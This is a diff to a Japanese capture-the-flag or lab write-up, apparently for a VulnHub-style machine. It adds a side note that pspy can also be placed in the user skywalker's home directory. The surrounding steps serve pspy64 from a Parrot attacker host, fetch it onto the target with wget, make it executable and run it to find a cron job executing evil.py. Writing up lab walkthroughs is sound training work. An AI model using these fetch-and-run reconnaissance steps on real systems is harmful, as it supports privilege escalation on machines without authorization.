@@ -61,6 +61,7 @@
   - pspyをダウンロードして。64bitなので
   - Parrotのpspy64ファイルのあるところで`python -m http.server 8080`
   - skywalkerに戻って、`cd /tmp`に移動してpspyを取得`wget http://192.168.56.101:8080/pspy64`
+  - (補足)`/tmp`だけでなく、`/home/skywalker/`のディレクトリにもおける
   - pspyの権限を変える　`chmod +x pspy64`
   - `./pspy64`
   - しばらくするとcronでevil.pyが動いているのがわかる
